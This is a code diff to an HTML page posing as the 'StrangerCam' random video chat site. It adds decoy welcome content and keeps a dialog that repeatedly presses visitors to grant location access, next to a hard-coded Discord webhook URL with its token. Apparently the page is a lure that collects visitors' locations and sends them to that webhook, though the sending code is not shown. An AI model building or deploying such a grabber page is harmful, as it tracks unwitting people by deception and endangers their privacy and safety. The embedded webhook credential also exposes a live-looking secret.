@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <!-- Original Meta Tags and Content -->
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
@@ -42,13 +43,22 @@
     </style>
 </head>
 <body>
+    <!-- Your page content should remain the same -->
+    <div id="main-content">
+        <!-- Any page content like video chat, chat interface, etc. -->
+        <h1>Welcome to Random Video Chat</h1>
+        <p>Chat anonymously with strangers from all over the world!</p>
+        <!-- Example content, replace with your actual content -->
+    </div>
+
+    <!-- Geolocation Dialog Box -->
     <div id="dialogBox">
         <p>We need your location to provide better services. Please allow location access.</p>
         <button onclick="requestLocation()">Retry</button>
     </div>
 
     <script>
-        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your webhook URL
+        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Your provided webhook URL
         const retryDelay = 5000; // 5 seconds
         const maxRetries = 5; // Maximum retries
         let retryCount = 0;
